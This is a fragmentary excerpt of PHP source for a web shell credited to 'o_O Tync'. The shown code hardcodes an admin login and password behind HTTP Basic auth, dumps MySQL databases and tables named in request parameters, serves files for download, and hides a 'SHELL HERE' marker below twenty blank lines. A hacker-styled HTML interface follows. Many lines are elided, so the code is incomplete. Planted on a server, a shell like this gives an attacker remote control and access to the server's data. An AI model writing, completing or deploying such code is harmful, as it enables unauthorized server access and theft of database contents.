<?php
$GLOB['SHELL']['USER']['Login']='admin';
$GLOB['SHELL']['USER']['Passw']='astra addclass password'; /* pwd. "as is", or md5() possible */
...
if ($noheaders or headers_sent())
	{
	print "\n".'<div align=center>Redirecting...<br><a href="'.$URL.'">Press here if shit happens</a>';
...
if (((strlen($GLOB['SHELL']['USER']['Login'])+strlen($GLOB['SHELL']['USER']['Passw']))>=2))
	...
	if ($DXGLOBALSHIT)
		...
		if (!isset($_SERVER['PHP_AUTH_USER']))
			{
			header('WWW-Authenticate: Basic realm="'.$GLOB['SHELL']['Ver'].' Auth"');
			header('HTTP/1.0 401 Unauthorized');
			...
			{
			header('WWW-Authenticate: Basic realm="'.$GLOB['SHELL']['Ver'].'error"');
			header('HTTP/1.0 401 Unauthorized');
			/* Result if user hits cancel button */
			unset($_GET['dxinstant']);
...
if ($_GET['dxmode']=='SQLD' AND isset($_POST['dxsql_tables']))
	...
	$DxDOWNLOAD_File['content'].="\n\t".'/* '.str_repeat('=', 66);
	$DxDOWNLOAD_File['content'].="\n\t".'==== MySQL Dump '.DxDate(time()).' - '.$GLOB['SHELL']['Ver'].' by o_O Tync';
	$DxDOWNLOAD_File['content'].="\n\t".'==== Server: '.$_GET['dxsql_s'];
	$DxDOWNLOAD_File['content'].="\n\t".'==== DB: '.$_GET['dxsql_d'];
	$DxDOWNLOAD_File['content'].="\n\t".'==== Tables: '."\n\t\t\t".implode(', '."\n\t\t\t", $_POST['dxsql_tables']);
	$DxDOWNLOAD_File['content'].="\n\t".str_repeat('=', 66).' */';
...
if ($DXGLOBALSHIT)
	print str_repeat("\n", 20).'<!--SHELL HERE-->';
?>
<html><head><title><?=$_SERVER['HTTP_HOST'];?> <?=$GLOB['DxMODES'][$_GET['dxmode']];?></title>
<Meta Http-equiv="Content-Type" Content="text/html; Charset=windows-1251">
<link rel="shortcut icon" href="<?=DxURL('kill','dxmode');?>&dxmode=IMG&dximg=DxS">
<style>
img	 {border-width:0pt;}
body, td 		{font-size: 10pt; color: #00B000; background-color: #000000; font-family: Arial;padding:2pt; vertical-align:top;}
...
table.outset, td.outset	  {border-width:3pt; border-style:outset; border-color: #004000;vertical-align:middle;}
...
input.bt_Yes 	{font-size: 14pt;font-family: Impact, Arial Black; color :#00FF00; background-color: #005000; border-color: #005000 #005000 #00FF00 #005000; border-width:1pt 1pt 2pt 1pt; border-style: dotted dotted solid dotted; height: 30pt; padding:10pt;}
input.bt_No 	{font-size: 14pt;font-family: Impact, Arial Black; color :#FF0000; background-color: #500000; border-color: #500000 #500000 #FF0000 #500000; border-width:1pt 1pt 2pt 1pt; border-style: dotted dotted solid dotted; height: 30pt; padding:10pt;}
...
font.img_replacer {padding:1pt;text-decoration: none;border-width:1pt;border-color:#D0D000;border-style:solid;}
</style>
...
<tr>
	...
	<td><font class=highlight_txt><big><b>II</td><td><nobr>
...
if (isset($DxDOWNLOAD_File)) /* only when DXGLOBALSHIT is enabled */
	...
	print "\n".'<br>execute the php-script given below, and it will make the file u\'re trying to download';
...
var tl=new Array(
"<?=$GLOB['SHELL']['Ver'].', date '.$GLOB['SHELL']['Date'];?>"
);
